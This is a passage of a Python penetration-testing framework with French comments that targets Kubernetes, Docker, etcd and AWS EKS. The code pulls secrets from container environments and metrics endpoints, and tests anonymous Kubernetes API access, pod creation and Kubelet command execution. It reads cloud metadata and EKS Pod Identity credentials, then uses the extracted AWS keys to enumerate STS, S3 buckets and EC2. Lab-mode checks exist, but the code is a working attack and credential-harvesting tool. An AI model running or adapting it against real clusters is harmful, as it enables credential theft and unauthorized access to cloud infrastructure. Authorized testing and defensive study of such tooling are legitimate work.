        for container in containers:
            container_id = container.get('Id', '')[:12]
            
            # Inspection détaillée du conteneur
            await self._inspect_docker_container(target, container_id)
    
    async def _inspect_docker_container(self, target: Target, container_id: str):
        """Inspection détaillée d'un conteneur Docker"""
        protocol = "https" if target.port == 2376 else "http"
        base_url = f"{protocol}://{target.host}:{target.port}"
        
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=self.session_timeout
        ) as session:
            
            try:
                async with session.get(f"{base_url}/containers/{container_id}/json") as response:
                    if response.status == 200:
                        container_info = await response.json()
                        
                        # Analyse des variables d'environnement
                        env_vars = container_info.get('Config', {}).get('Env', [])
                        for env_var in env_vars:
                            if '=' in env_var:
                                key, value = env_var.split('=', 1)
                                if await self._is_sensitive_env_var({'name': key, 'value': value}):
                                    self.add_finding(
                                        target=str(target),
                                        service="docker_container",
                                        phase=PhaseType.CREDENTIAL_EXTRACTION.value,
                                        vulnerability="Sensitive environment variable in Docker container",
                                        severity=SeverityLevel.HIGH,
                                        description=f"Sensitive environment variable in container {container_id}",
                                        evidence={
                                            "container_id": container_id,
                                            "env_var_name": key,
                                            "env_var_value": value[:50] + "..." if len(value) > 50 else value
                                        },
                                        remediation="Use Docker secrets for sensitive environment variables"
                                    )
                        
                        # Analyse des volumes montés
                        mounts = container_info.get('Mounts', [])
                        for mount in mounts:
                            if mount.get('Type') == 'bind' and 'secret' in mount.get('Source', '').lower():
                                self.add_finding(
                                    target=str(target),
                                    service="docker_container",
                                    phase=PhaseType.CREDENTIAL_EXTRACTION.value,
                                    vulnerability="Potential secret mount in Docker container",
                                    severity=SeverityLevel.MEDIUM,
                                    description=f"Potential secret mount in container {container_id}",
                                    evidence={
                                        "container_id": container_id,
                                        "mount_source": mount.get('Source'),
                                        "mount_destination": mount.get('Destination')
                                    },
                                    remediation="Review mounted volumes for sensitive data"
                                )
            except Exception as e:
                self.logger.debug(f"Error inspecting container {container_id}: {e}")
    
    async def _extract_from_etcd(self, target: Target):
        """Extraction depuis etcd"""
        endpoints = ["/v2/keys", "/v3/kv/range"]
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                for endpoint in endpoints:
                    try:
                        async with session.get(f"{base_url}{endpoint}") as response:
                            if response.status == 200:
                                data = await response.json()
                                await self._analyze_etcd_keys(target, data)
                    except Exception as e:
                        self.logger.debug(f"Error accessing etcd {endpoint}: {e}")
    
    async def _analyze_etcd_keys(self, target: Target, data: Dict):
        """Analyse des clés etcd"""
        # Implementation for etcd key analysis
        # This would recursively analyze etcd key-value pairs for sensitive data
        pass
    
    async def _extract_from_metrics(self, target: Target):
        """Extraction générique depuis les endpoints de métriques"""
        metrics_endpoints = ["/metrics", "/stats", "/status"]
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                for endpoint in metrics_endpoints:
                    try:
                        async with session.get(f"{base_url}{endpoint}") as response:
                            if response.status == 200:
                                content = await response.text()
                                sensitive_findings = await self._scan_for_sensitive_data(content)
                                
                                if sensitive_findings:
                                    self.add_finding(
                                        target=str(target),
                                        service="metrics_endpoint",
                                        phase=PhaseType.CREDENTIAL_EXTRACTION.value,
                                        vulnerability="Sensitive data in metrics endpoint",
                                        severity=SeverityLevel.MEDIUM,
                                        description=f"Sensitive data found in {endpoint}",
                                        evidence={
                                            "endpoint": endpoint,
                                            "patterns_found": sensitive_findings
                                        },
                                        remediation="Filter sensitive data from metrics exposure"
                                    )
                    except Exception as e:
                        self.logger.debug(f"Error accessing metrics {endpoint}: {e}")
    
    async def _scan_for_sensitive_data(self, content: str) -> List[str]:
        """Scan de contenu pour données sensibles"""
        findings = []
        
        for pattern in self.sensitive_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            if matches:
                for match in matches:
                    if isinstance(match, tuple):
                        findings.append(match[0] if match[0] else match[1])
                    else:
                        findings.append(match)
        
        return list(set(findings))  # Remove duplicates
    
    async def _is_sensitive_env_var(self, env_var: Dict) -> bool:
        """Vérification si une variable d'environnement est sensible"""
        name = env_var.get('name', '').lower()
        value = env_var.get('value', '')
        
        # Check name patterns
        for sensitive_name in self.sensitive_env_vars:
            if sensitive_name in name:
                return True
        
        # Check value patterns
        if len(value) > 16:  # Minimum length for potential credentials
            sensitive_value_patterns = await self._scan_for_sensitive_data(value)
            return len(sensitive_value_patterns) > 0
        
        return False
    
    async def _is_jwt_token(self, value: str) -> bool:
        """Vérification si une valeur est un token JWT"""
        return value.count('.') == 2 and len(value) > 50 and value.startswith('eyJ')
    
    async def _decode_jwt(self, token: str) -> Dict:
        """Décodage d'un token JWT sans vérification"""
        try:
            # Décodage sans vérification de signature pour l'analyse
            decoded = jwt.decode(token, options={"verify_signature": False})
            
            # Extraction des informations importantes
            return {
                "valid": True,
                "claims": decoded,
                "issuer": decoded.get('iss'),
                "subject": decoded.get('sub'),
                "audience": decoded.get('aud'),
                "expiration": decoded.get('exp'),
                "issued_at": decoded.get('iat'),
                "not_before": decoded.get('nbf'),
                "scopes": decoded.get('scope', '').split() if decoded.get('scope') else []
            }
        except Exception as e:
            return {
                "valid": False,
                "error": str(e),
                "token_sample": token[:50] + "..."
            }

# ============================================================================
# PHASE 3 - KUBERNETES EXPLOITATION
# ============================================================================

class KubernetesExploiter(BaseModule):
    """Module d'exploitation Kubernetes pour tests en lab"""
    
    def __init__(self, config: FrameworkConfig):
        super().__init__(config)
        self.rbac_test_payloads = [
            "system:masters",
            "cluster-admin",
            "system:node",
            "system:serviceaccount:kube-system:default"
        ]
    
    async def execute(self, targets: List[Target]) -> List[Finding]:
        """Exécution des tests d'exploitation Kubernetes"""
        self.logger.info(f"Starting Kubernetes exploitation tests on {len(targets)} targets")
        
        if not self.config.lab_mode:
            self.logger.warning("Exploitation tests should only be run in lab mode!")
            return []
        
        tasks = []
        for target in targets:
            if isinstance(target, str):
                host, port = target.split(':') if ':' in target else (target, 6443)
                target = Target(host=host, port=int(port), service=ServiceType.KUBERNETES_API)
            
            if not self._is_target_allowed(target.host):
                continue
            
            tasks.append(self._exploit_target(target))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.findings
    
    async def _exploit_target(self, target: Target):
        """Tests d'exploitation sur une cible"""
        try:
            # Tests d'accès anonyme
            await self._test_anonymous_access(target)
            
            # Tests RBAC
            await self._test_rbac_misconfigurations(target)
            
            # Tests d'exécution de commandes
            await self._test_command_execution(target)
            
            # Tests d'évasion de conteneur
            await self._test_container_escape(target)
            
            # Tests d'élévation de privilèges
            await self._test_privilege_escalation(target)
            
        except Exception as e:
            self.logger.error(f"Error during exploitation of {target}: {e}")
    
    async def _test_anonymous_access(self, target: Target):
        """Test d'accès anonyme à l'API Kubernetes"""
        sensitive_endpoints = [
            "/api/v1/secrets",
            "/api/v1/nodes",
            "/api/v1/serviceaccounts",
            "/api/v1/namespaces/kube-system/secrets"
        ]
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                for endpoint in sensitive_endpoints:
                    try:
                        # Test sans authentification
                        async with session.get(f"{base_url}{endpoint}") as response:
                            if response.status == 200:
                                data = await response.json()
                                
                                self.add_finding(
                                    target=str(target),
                                    service="kubernetes_api",
                                    phase=PhaseType.KUBERNETES_EXPLOITATION.value,
                                    vulnerability="Anonymous access to sensitive API endpoint",
                                    severity=SeverityLevel.CRITICAL,
                                    description=f"Anonymous access granted to {endpoint}",
                                    evidence={
                                        "endpoint": endpoint,
                                        "response_items": len(data.get('items', [])),
                                        "method": "anonymous"
                                    },
                                    remediation="Enable authentication and proper RBAC for API access"
                                )
                                
                                # Test de création de ressources
                                await self._test_resource_creation(session, base_url, target)
                                
                    except Exception as e:
                        self.logger.debug(f"Anonymous access test failed for {endpoint}: {e}")
    
    async def _test_resource_creation(self, session, base_url, target):
        """Test de création de ressources avec accès anonyme"""
        test_pod = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": "pentest-pod",
                "namespace": "default"
            },
            "spec": {
                "containers": [{
                    "name": "test-container",
                    "image": "busybox",
                    "command": ["sleep", "3600"]
                }]
            }
        }
        
        try:
            async with session.post(
                f"{base_url}/api/v1/namespaces/default/pods",
                json=test_pod,
                headers={"Content-Type": "application/json"}
            ) as response:
                if response.status == 201:
                    self.add_finding(
                        target=str(target),
                        service="kubernetes_api",
                        phase=PhaseType.KUBERNETES_EXPLOITATION.value,
                        vulnerability="Anonymous pod creation allowed",
                        severity=SeverityLevel.CRITICAL,
                        description="Successfully created pod with anonymous access",
                        evidence={
                            "pod_name": "pentest-pod",
                            "namespace": "default",
                            "response_status": response.status
                        },
                        remediation="Implement proper RBAC to prevent unauthorized resource creation"
                    )
                    
                    # Cleanup: Delete the test pod
                    await self._cleanup_test_pod(session, base_url, "pentest-pod")
                    
        except Exception as e:
            self.logger.debug(f"Pod creation test failed: {e}")
    
    async def _cleanup_test_pod(self, session, base_url, pod_name):
        """Nettoyage du pod de test"""
        try:
            async with session.delete(f"{base_url}/api/v1/namespaces/default/pods/{pod_name}") as response:
                self.logger.debug(f"Cleanup pod {pod_name}: {response.status}")
        except Exception as e:
            self.logger.debug(f"Failed to cleanup pod {pod_name}: {e}")
    
    async def _test_rbac_misconfigurations(self, target: Target):
        """Test des mauvaises configurations RBAC"""
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            # Test avec différents service accounts
            service_accounts = [
                "system:serviceaccount:default:default",
                "system:serviceaccount:kube-system:default",
                "system:serviceaccount:kube-public:default"
            ]
            
            for sa in service_accounts:
                await self._test_service_account_permissions(base_url, target, sa)
    
    async def _test_service_account_permissions(self, base_url, target, service_account):
        """Test des permissions d'un service account"""
        # Simulation de token pour le service account (en lab uniquement)
        test_endpoints = [
            "/api/v1/secrets",
            "/api/v1/nodes",
            "/api/v1/pods"
        ]
        
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=self.session_timeout
        ) as session:
            
            # Test des permissions avec le service account
            headers = {"Authorization": f"Bearer {service_account}"}
            
            for endpoint in test_endpoints:
                try:
                    async with session.get(f"{base_url}{endpoint}", headers=headers) as response:
                        if response.status == 200:
                            self.add_finding(
                                target=str(target),
                                service="kubernetes_rbac",
                                phase=PhaseType.KUBERNETES_EXPLOITATION.value,
                                vulnerability="Overprivileged service account",
                                severity=SeverityLevel.HIGH,
                                description=f"Service account {service_account} has access to {endpoint}",
                                evidence={
                                    "service_account": service_account,
                                    "endpoint": endpoint,
                                    "access_granted": True
                                },
                                remediation="Review and restrict service account permissions"
                            )
                except Exception as e:
                    self.logger.debug(f"RBAC test failed for {service_account} on {endpoint}: {e}")
    
    async def _test_command_execution(self, target: Target):
        """Test d'exécution de commandes via Kubelet"""
        if target.service != ServiceType.KUBELET:
            return
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            # Récupération de la liste des pods
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                try:
                    async with session.get(f"{base_url}/pods") as response:
                        if response.status == 200:
                            pods_data = await response.json()
                            
                            for pod in pods_data.get('items', []):
                                pod_name = pod.get('metadata', {}).get('name')
                                namespace = pod.get('metadata', {}).get('namespace', 'default')
                                
                                if pod_name:
                                    await self._test_pod_exec(session, base_url, target, namespace, pod_name)
                                    
                except Exception as e:
                    self.logger.debug(f"Failed to get pods for command execution test: {e}")
    
    async def _test_pod_exec(self, session, base_url, target, namespace, pod_name):
        """Test d'exécution de commandes dans un pod"""
        exec_endpoint = f"/exec/{namespace}/{pod_name}/container"
        
        # Commandes de test sécurisées pour lab
        test_commands = ["id", "whoami", "ls /"]
        
        for command in test_commands:
            try:
                params = {
                    "command": command,
                    "stdout": "true",
                    "stderr": "true"
                }
                
                async with session.get(f"{base_url}{exec_endpoint}", params=params) as response:
                    if response.status == 200:
                        output = await response.text()
                        
                        self.add_finding(
                            target=str(target),
                            service="kubelet_exec",
                            phase=PhaseType.KUBERNETES_EXPLOITATION.value,
                            vulnerability="Command execution via Kubelet",
                            severity=SeverityLevel.CRITICAL,
                            description=f"Command execution successful on pod {pod_name}",
                            evidence={
                                "pod_name": pod_name,
                                "namespace": namespace,
                                "command": command,
                                "output_sample": output[:200] + "..." if len(output) > 200 else output
                            },
                            remediation="Secure Kubelet API and disable unauthorized command execution"
                        )
                        
            except Exception as e:
                self.logger.debug(f"Command execution test failed for {command} on {pod_name}: {e}")
    
    async def _test_container_escape(self, target: Target):
        """Test d'évasion de conteneur"""
        escape_tests = [
            {
                "name": "Privileged container detection",
                "description": "Check for privileged containers that can escape to host",
                "method": self._check_privileged_containers
            },
            {
                "name": "Host path mount detection",
                "description": "Check for dangerous host path mounts",
                "method": self._check_host_mounts
            },
            {
                "name": "Capabilities check",
                "description": "Check for dangerous capabilities",
                "method": self._check_dangerous_capabilities
            }
        ]
        
        for test in escape_tests:
            try:
                await test["method"](target)
            except Exception as e:
                self.logger.debug(f"Container escape test '{test['name']}' failed: {e}")
    
    async def _check_privileged_containers(self, target: Target):
        """Vérification des conteneurs privilégiés"""
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                try:
                    async with session.get(f"{base_url}/pods") as response:
                        if response.status == 200:
                            pods_data = await response.json()
                            
                            for pod in pods_data.get('items', []):
                                pod_name = pod.get('metadata', {}).get('name')
                                containers = pod.get('spec', {}).get('containers', [])
                                
                                for container in containers:
                                    security_context = container.get('securityContext', {})
                                    if security_context.get('privileged', False):
                                        self.add_finding(
                                            target=str(target),
                                            service="kubernetes_security",
                                            phase=PhaseType.KUBERNETES_EXPLOITATION.value,
                                            vulnerability="Privileged container detected",
                                            severity=SeverityLevel.HIGH,
                                            description=f"Privileged container found in pod {pod_name}",
                                            evidence={
                                                "pod_name": pod_name,
                                                "container_name": container.get('name'),
                                                "privileged": True,
                                                "security_context": security_context
                                            },
                                            remediation="Remove privileged flag and use least privilege principle"
                                        )
                except Exception as e:
                    self.logger.debug(f"Privileged container check failed: {e}")
    
    async def _check_host_mounts(self, target: Target):
        """Vérification des montages de host dangereux"""
        dangerous_paths = [
            "/", "/etc", "/proc", "/sys", "/var/run/docker.sock",
            "/dev", "/boot", "/lib/modules"
        ]
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                try:
                    async with session.get(f"{base_url}/pods") as response:
                        if response.status == 200:
                            pods_data = await response.json()
                            
                            for pod in pods_data.get('items', []):
                                pod_name = pod.get('metadata', {}).get('name')
                                volumes = pod.get('spec', {}).get('volumes', [])
                                
                                for volume in volumes:
                                    host_path = volume.get('hostPath', {}).get('path', '')
                                    
                                    for dangerous_path in dangerous_paths:
                                        if host_path.startswith(dangerous_path):
                                            self.add_finding(
                                                target=str(target),
                                                service="kubernetes_security",
                                                phase=PhaseType.KUBERNETES_EXPLOITATION.value,
                                                vulnerability="Dangerous host path mount",
                                                severity=SeverityLevel.HIGH,
                                                description=f"Dangerous host path mount in pod {pod_name}",
                                                evidence={
                                                    "pod_name": pod_name,
                                                    "volume_name": volume.get('name'),
                                                    "host_path": host_path,
                                                    "dangerous_path_matched": dangerous_path
                                                },
                                                remediation="Restrict host path mounts to specific directories only"
                                            )
                except Exception as e:
                    self.logger.debug(f"Host mount check failed: {e}")
    
    async def _check_dangerous_capabilities(self, target: Target):
        """Vérification des capabilities dangereuses"""
        dangerous_caps = [
            "SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "DAC_READ_SEARCH",
            "DAC_OVERRIDE", "SYS_RAWIO", "SYS_TIME", "NET_ADMIN"
        ]
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                try:
                    async with session.get(f"{base_url}/pods") as response:
                        if response.status == 200:
                            pods_data = await response.json()
                            
                            for pod in pods_data.get('items', []):
                                pod_name = pod.get('metadata', {}).get('name')
                                containers = pod.get('spec', {}).get('containers', [])
                                
                                for container in containers:
                                    security_context = container.get('securityContext', {})
                                    capabilities = security_context.get('capabilities', {})
                                    add_caps = capabilities.get('add', [])
                                    
                                    for cap in add_caps:
                                        if cap in dangerous_caps:
                                            self.add_finding(
                                                target=str(target),
                                                service="kubernetes_security",
                                                phase=PhaseType.KUBERNETES_EXPLOITATION.value,
                                                vulnerability="Dangerous capability granted",
                                                severity=SeverityLevel.MEDIUM,
                                                description=f"Dangerous capability {cap} in pod {pod_name}",
                                                evidence={
                                                    "pod_name": pod_name,
                                                    "container_name": container.get('name'),
                                                    "capability": cap,
                                                    "all_added_caps": add_caps
                                                },
                                                remediation="Remove unnecessary capabilities and follow least privilege"
                                            )
                except Exception as e:
                    self.logger.debug(f"Capabilities check failed: {e}")
    
    async def _test_privilege_escalation(self, target: Target):
        """Test d'élévation de privilèges"""
        escalation_tests = [
            {
                "name": "Service account token access",
                "method": self._test_service_account_tokens
            },
            {
                "name": "Node proxy access",
                "method": self._test_node_proxy_access
            },
            {
                "name": "Metadata service access",
                "method": self._test_metadata_access
            }
        ]
        
        for test in escalation_tests:
            try:
                await test["method"](target)
            except Exception as e:
                self.logger.debug(f"Privilege escalation test '{test['name']}' failed: {e}")
    
    async def _test_service_account_tokens(self, target: Target):
        """Test d'accès aux tokens de service account"""
        token_paths = [
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
            "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
            "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
        ]
        
        # This would be tested within containers in a real scenario
        # For now, we check if these paths are accessible via API
        pass
    
    async def _test_node_proxy_access(self, target: Target):
        """Test d'accès via le proxy de nœud"""
        if target.service == ServiceType.KUBERNETES_API:
            base_url = f"https://{target.host}:{target.port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                try:
                    # Test d'accès aux nœuds via proxy
                    async with session.get(f"{base_url}/api/v1/nodes") as response:
                        if response.status == 200:
                            nodes_data = await response.json()
                            
                            for node in nodes_data.get('items', []):
                                node_name = node.get('metadata', {}).get('name')
                                
                                # Test d'accès au proxy du nœud
                                proxy_endpoint = f"/api/v1/nodes/{node_name}/proxy"
                                
                                try:
                                    async with session.get(f"{base_url}{proxy_endpoint}") as proxy_response:
                                        if proxy_response.status == 200:
                                            self.add_finding(
                                                target=str(target),
                                                service="kubernetes_node_proxy",
                                                phase=PhaseType.KUBERNETES_EXPLOITATION.value,
                                                vulnerability="Node proxy access available",
                                                severity=SeverityLevel.HIGH,
                                                description=f"Node proxy access available for {node_name}",
                                                evidence={
                                                    "node_name": node_name,
                                                    "proxy_endpoint": proxy_endpoint,
                                                    "accessible": True
                                                },
                                                remediation="Restrict node proxy access and implement proper RBAC"
                                            )
                                except Exception as e:
                                    self.logger.debug(f"Node proxy test failed for {node_name}: {e}")
                                    
                except Exception as e:
                    self.logger.debug(f"Node proxy access test failed: {e}")
    
    async def _test_metadata_access(self, target: Target):
        """Test d'accès au service de métadonnées"""
        metadata_endpoints = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance"
        ]
        
        async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
            for endpoint in metadata_endpoints:
                try:
                    headers = {}
                    if "google" in endpoint:
                        headers["Metadata-Flavor"] = "Google"
                    elif "169.254.169.254/metadata" in endpoint:
                        headers["Metadata"] = "true"
                    
                    async with session.get(endpoint, headers=headers) as response:
                        if response.status == 200:
                            self.add_finding(
                                target=str(target),
                                service="metadata_service",
                                phase=PhaseType.KUBERNETES_EXPLOITATION.value,
                                vulnerability="Cloud metadata service accessible",
                                severity=SeverityLevel.MEDIUM,
                                description=f"Cloud metadata service accessible at {endpoint}",
                                evidence={
                                    "endpoint": endpoint,
                                    "accessible": True,
                                    "response_length": len(await response.text())
                                },
                                remediation="Block access to cloud metadata services from containers"
                            )
                except Exception as e:
                    self.logger.debug(f"Metadata service test failed for {endpoint}: {e}")

# ============================================================================
# PHASE 4 - EKS POD IDENTITY
# ============================================================================

class EKSPodIdentityTester(BaseModule):
    """Testeur pour EKS Pod Identity et accès AWS"""
    
    def __init__(self, config: FrameworkConfig):
        super().__init__(config)
        self.eks_metadata_ip = "169.254.170.23"
        self.aws_metadata_ip = "169.254.169.254"
        
    async def execute(self, targets: List[Target]) -> List[Finding]:
        """Exécution des tests EKS Pod Identity"""
        self.logger.info("Starting EKS Pod Identity tests")
        
        if not self.config.lab_mode:
            self.logger.warning("EKS Pod Identity tests should only be run in authorized environments!")
            return []
        
        # Test des métadonnées EKS
        await self._test_eks_metadata_access()
        
        # Test des credentials AWS
        await self._test_aws_credentials()
        
        # Test des permissions IAM
        await self._test_iam_permissions()
        
        # Test de l'escalade de privilèges AWS
        await self._test_aws_privilege_escalation()
        
        return self.findings
    
    async def _test_eks_metadata_access(self):
        """Test d'accès aux métadonnées EKS"""
        eks_endpoints = [
            f"http://{self.eks_metadata_ip}/v1/credentials",
            f"http://{self.eks_metadata_ip}/v1/association",
            f"http://{self.eks_metadata_ip}/v1/credentials/role-arn"
        ]
        
        async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
            for endpoint in eks_endpoints:
                try:
                    async with session.get(endpoint) as response:
                        if response.status == 200:
                            data = await response.text()
                            
                            self.add_finding(
                                target=self.eks_metadata_ip,
                                service="eks_pod_identity",
                                phase=PhaseType.EKS_POD_IDENTITY.value,
                                vulnerability="EKS Pod Identity metadata accessible",
                                severity=SeverityLevel.INFO,
                                description=f"EKS metadata endpoint accessible: {endpoint}",
                                evidence={
                                    "endpoint": endpoint,
                                    "response_data": data[:500] + "..." if len(data) > 500 else data,
                                    "accessible": True
                                },
                                remediation="Review EKS Pod Identity configuration and IAM role associations"
                            )
                            
                            # Parse credentials if available
                            await self._parse_eks_credentials(data, endpoint)
                            
                except Exception as e:
                    self.logger.debug(f"EKS metadata access failed for {endpoint}: {e}")
    
    async def _parse_eks_credentials(self, data: str, endpoint: str):
        """Parse des credentials EKS"""
        try:
            if "credentials" in endpoint:
                # Try to parse as JSON
                try:
                    creds = json.loads(data)
                    
                    if 'AccessKeyId' in creds and 'SecretAccessKey' in creds:
                        self.add_finding(
                            target=self.eks_metadata_ip,
                            service="eks_credentials",
                            phase=PhaseType.EKS_POD_IDENTITY.value,
                            vulnerability="EKS Pod Identity credentials extracted",
                            severity=SeverityLevel.HIGH,
                            description="AWS credentials successfully extracted from EKS Pod Identity",
                            evidence={
                                "access_key_id": creds.get('AccessKeyId', '')[:10] + "...",
                                "session_token_present": 'SessionToken' in creds,
                                "expiration": creds.get('Expiration', ''),
                                "role_arn": creds.get('RoleArn', '')
                            },
                            remediation="Review IAM role permissions and implement least privilege"
                        )
                        
                        # Test the credentials
                        await self._test_extracted_credentials(creds)
                        
                except json.JSONDecodeError:
                    # Not JSON, might be plain text credentials
                    lines = data.split('\n')
                    for line in lines:
                        if 'AWS_ACCESS_KEY_ID' in line or 'AccessKeyId' in line:
                            self.add_finding(
                                target=self.eks_metadata_ip,
                                service="eks_credentials",
                                phase=PhaseType.EKS_POD_IDENTITY.value,
                                vulnerability="AWS credentials found in EKS metadata",
                                severity=SeverityLevel.HIGH,
                                description="AWS credentials found in EKS metadata response",
                                evidence={
                                    "credential_line": line[:100] + "..." if len(line) > 100 else line
                                },
                                remediation="Secure EKS Pod Identity configuration"
                            )
                            
        except Exception as e:
            self.logger.debug(f"Error parsing EKS credentials: {e}")
    
    async def _test_extracted_credentials(self, creds: Dict):
        """Test des credentials extraits"""
        try:
            # Configuration du client boto3 avec les credentials extraits
            session = boto3.Session(
                aws_access_key_id=creds.get('AccessKeyId'),
                aws_secret_access_key=creds.get('SecretAccessKey'),
                aws_session_token=creds.get('SessionToken'),
                region_name=self.config.aws_region
            )
            
            # Test des permissions de base
            await self._test_sts_permissions(session)
            await self._test_s3_permissions(session)
            await self._test_ec2_permissions(session)
            await self._test_iam_permissions_with_session(session)
            
        except Exception as e:
            self.logger.error(f"Error testing extracted credentials: {e}")
    
    async def _test_sts_permissions(self, session):
        """Test des permissions STS"""
        try:
            sts_client = session.client('sts')
            
            # Test whoami
            identity = sts_client.get_caller_identity()
            
            self.add_finding(
                target="aws_sts",
                service="aws_sts",
                phase=PhaseType.EKS_POD_IDENTITY.value,
                vulnerability="AWS STS access with extracted credentials",
                severity=SeverityLevel.MEDIUM,
                description="Successfully accessed AWS STS with extracted credentials",
                evidence={
                    "user_id": identity.get('UserId', ''),
                    "account": identity.get('Account', ''),
                    "arn": identity.get('Arn', '')
                },
                remediation="Review IAM role permissions and implement least privilege"
            )
            
        except ClientError as e:
            self.logger.debug(f"STS permission test failed: {e}")
        except Exception as e:
            self.logger.error(f"STS test error: {e}")
    
    async def _test_s3_permissions(self, session):
        """Test des permissions S3"""
        try:
            s3_client = session.client('s3')
            
            # Test list buckets
            try:
                buckets = s3_client.list_buckets()
                
                self.add_finding(
                    target="aws_s3",
                    service="aws_s3",
                    phase=PhaseType.EKS_POD_IDENTITY.value,
                    vulnerability="S3 bucket listing access",
                    severity=SeverityLevel.MEDIUM,
                    description="Can list S3 buckets with extracted credentials",
                    evidence={
                        "bucket_count": len(buckets.get('Buckets', [])),
                        "buckets": [b['Name'] for b in buckets.get('Buckets', [])][:10]  # First 10 only
                    },
                    remediation="Restrict S3 permissions to necessary buckets only"
                )
                
                # Test access to specific buckets
                for bucket in buckets.get('Buckets', [])[:5]:  # Test first 5 buckets
                    await self._test_bucket_access(s3_client, bucket['Name'])
                    
            except ClientError as e:
                if e.response['Error']['Code'] == 'AccessDenied':
                    self.logger.debug("S3 list buckets access denied")
                else:
                    self.logger.debug(f"S3 permission test failed: {e}")
                    
        except Exception as e:
            self.logger.error(f"S3 test error: {e}")
    
    async def _test_bucket_access(self, s3_client, bucket_name):
        """Test d'accès à un bucket spécifique"""
        try:
            # Test list objects
            response = s3_client.list_objects_v2(Bucket=bucket_name, MaxKeys=10)
            
            self.add_finding(
                target=f"s3://{bucket_name}",
                service="aws_s3_bucket",
                phase=PhaseType.EKS_POD_IDENTITY.value,
                vulnerability="S3 bucket read access",
                severity=SeverityLevel.MEDIUM,
                description=f"Can list objects in S3 bucket {bucket_name}",
                evidence={
                    "bucket_name": bucket_name,
                    "object_count": response.get('KeyCount', 0),
                    "objects": [obj['Key'] for obj in response.get('Contents', [])][:5]
                },
                remediation="Implement bucket-level access controls and encryption"
            )
            
        except ClientError as e:
            if e.response['Error']['Code'] not in ['AccessDenied', 'NoSuchBucket']:
                self.logger.debug(f"Bucket {bucket_name} access test failed: {e}")
        except Exception as e:
            self.logger.error(f"Bucket access test error: {e}")
    
    async def _test_ec2_permissions(self, session):
        """Test des permissions EC2"""
        try:
            ec2_client = session.client('ec2')
            
            # Test describe instances
            try:
                instances = ec2_client.describe_instances()
                
                instance_count = sum(len(reservation['Instances']) for reservation in instances.get('Reservations', []))
                
                self.add_finding(
                    target="aws_ec2",
                    service="aws_ec2",
                    phase=PhaseType.EKS_POD_IDENTITY.value,
                    vulnerability="EC2 instance enumeration access",
                    severity=SeverityLevel.MEDIUM,
                    description="Can enumerate EC2 instances with extracted credentials",
                    evidence={
                        "instance_count": instance_count,
                        "reservation_count": len(instances.get('Reservations', []))
                    },
                    remediation="Restrict EC2 permissions to necessary operations only"
                )
                
            except ClientError as e:
                if e.response['Error']['Code'] == 'UnauthorizedOperation':
                    self.logger.debug("EC2 describe instances access denied")
                else:
                    self.logger.debug(f"EC2 permission test failed: {e}")
                    
            # Test other EC2 operations
            await self._test_ec2_security_groups(ec2_client)
            await self._test_ec2_key_pairs(ec2_client)
            
        except Exception as e:
            self.logger.error(f"EC2 test error: {e}")
    
    async def _test_ec2_security_groups(self, ec2_client):
        """Test d'accès aux groupes de sécurité EC2"""
        try:
            security_groups = ec2_client.describe_security_groups()
            
            self.add_finding(
                target="aws_ec2_sg",
                service="aws_ec2",
                phase=PhaseType.EKS_POD_IDENTITY.value,
                vulnerability="EC2 security group enumeration access",
                severity=SeverityLevel.LOW,
                description="Can enumerate EC2 security groups",
                evidence={
                    "security_group_count": len(security_groups.get('SecurityGroups', []))
                },
                remediation="Restrict EC2 security group permissions"
            )
            
        except ClientError as e:
            if e.response['Error']['Code'] != 'UnauthorizedOperation':
                self.logger.debug(f"Security groups test failed: {e}")
        except Exception as e:
            self.logger.error(f"Security groups test error: {e}")
    
    async def _test_ec2_key_pairs(self, ec2_client):
        """Test d'accès aux paires de clés EC2"""
        try:
            key_pairs = ec2_client.describe_key_pairs()
            
            if key_pairs.get('KeyPairs'):
                self.add_finding(
                    target="aws_ec2_keys",
                    service="aws_ec2",
                    phase=PhaseType.EKS_POD_IDENTITY.value,
                    vulnerability="EC2 key pair enumeration access",
                    severity=SeverityLevel.LOW,
                    description="Can enumerate EC2 key pairs",
                    evidence={
                        "key_pair_count": len(key_pairs.get('KeyPairs', [])),
